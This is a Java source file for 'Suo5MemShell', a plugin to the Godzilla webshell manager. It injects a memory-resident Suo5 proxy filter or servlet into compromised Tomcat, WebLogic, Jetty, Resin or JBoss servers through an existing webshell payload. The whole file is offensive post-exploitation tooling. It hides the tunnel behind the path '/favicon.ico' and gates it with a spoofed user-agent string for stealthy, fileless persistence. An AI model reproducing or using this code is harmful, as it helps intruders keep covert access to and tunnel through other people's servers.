package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;

@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Suo5MemShell", DisplayName = "Suo5MemShell")
public class Suo5MemShell implements Plugin {
    private static final String[] PROXY_TYPE = new String[]{"Suo5TomcatFilter", "Suo5TomcatServlet", "Suo5WebLogicFilter", "Suo5JettyFilter", "Suo5ResinFilter", "Suo5JBossFilter"};
    private static final String CLASS_NAME = "plugins.Suo5MemShell";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JLabel urlPatternPassLabel = new JLabel("urlPattern (servletPath): ");
    private final JLabel typeLabel = new JLabel("type: ");
    private final JTextField urlPatternTextField = new JTextField("/favicon.ico", 15);
    private final JLabel filterNameLabel = new JLabel("filterName (when Suo5TomcatFilter): ");
    private final JTextField filterNameTextField = new JTextField("", 15);
    private final JLabel userAgentLabel = new JLabel("user-agent: ");
    private final JTextField userAgentTextField = new JTextField("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3", 20);
    private final JComboBox<String> typeComboBox;
    private final JButton injectButton;
    private final JSplitPane splitPane;
    private final RTextArea resultTextArea;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Suo5MemShell() {
        this.typeComboBox = new JComboBox(PROXY_TYPE);
        this.injectButton = new JButton("inject");
        this.resultTextArea = new RTextArea();
        this.resultTextArea.append("Godzilla-Suo5MemShell version 0.4\n");
        this.splitPane = new JSplitPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.urlPatternPassLabel);
        topPanel.add(this.urlPatternTextField);
        topPanel.add(this.filterNameLabel);
        topPanel.add(this.filterNameTextField);
        topPanel.add(this.userAgentLabel);
        topPanel.add(this.userAgentTextField);
        topPanel.add(this.typeLabel);
        topPanel.add(this.typeComboBox);
        topPanel.add(this.injectButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                Suo5MemShell.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
    }


    private void injectButtonClick(ActionEvent actionEvent) {
        try {
            String urlPattern = this.urlPatternTextField.getText();
            if (urlPattern.length() > 0) {
                String proxyType = (String) this.typeComboBox.getSelectedItem();
                String filterName = this.filterNameTextField.getText();
                String userAgent = this.userAgentTextField.getText();
                InputStream inputStream;
                String className = proxyType;
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("userAgent", userAgent);

                if (proxyType.equals("Suo5TomcatFilter")) {
                    inputStream = this.getClass().getResourceAsStream("/Suo5TomcatFilter.class");
                    reqParameter.add("urlPattern", urlPattern);
                    reqParameter.add("filterName", filterName);
                } else if (proxyType.equals("Suo5TomcatServlet")) {
                    inputStream = this.getClass().getResourceAsStream("/Suo5TomcatServlet.class");
                    reqParameter.add("servletPath", urlPattern);
                } else {
                    inputStream = this.getClass().getResourceAsStream(String.format("/%s.class", proxyType));
                    reqParameter.add("urlPattern", urlPattern);
                }

                byte[] classByteArray = functions.readInputStream(inputStream);
                inputStream.close();
                boolean loaderState = this.payload.include(className, classByteArray);

                if (loaderState) {
                    byte[] result = this.payload.evalFunc(className, "run", reqParameter);
                    String resultString = this.encoding.Decoding(result);
                    Log.log(resultString, new Object[0]);
                    if (proxyType.equals("Suo5TomcatFilter")) {
                        this.resultTextArea.append(String.format("injecting Suo5TomcatFilter, filterName: %s, urlPattern: %s, result: %s\n", filterName.isEmpty()?"[random]":filterName, urlPattern, resultString));
                    } else if (proxyType.equals("Suo5TomcatServlet")) {
                        this.resultTextArea.append(String.format("injecting Suo5TomcatServlet, servletPath: %s, result: %s\n", urlPattern, resultString));
                    } else {
                        this.resultTextArea.append(String.format("injecting %s, urlPattern: %s, result: %s\n", proxyType, urlPattern, resultString));
                    }
                    this.resultTextArea.append(String.format("user-agent: %s\n", userAgent));
                    GOptionPane.showMessageDialog(this.panel, "ok", "提示", 1);
                } else {
                    GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "url pattern is Null", "提示", 2);
            }
        } catch (Exception var13) {
            Log.error(var13);
            GOptionPane.showMessageDialog(this.panel, var13.getMessage(), "提示", 2);
        }

    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
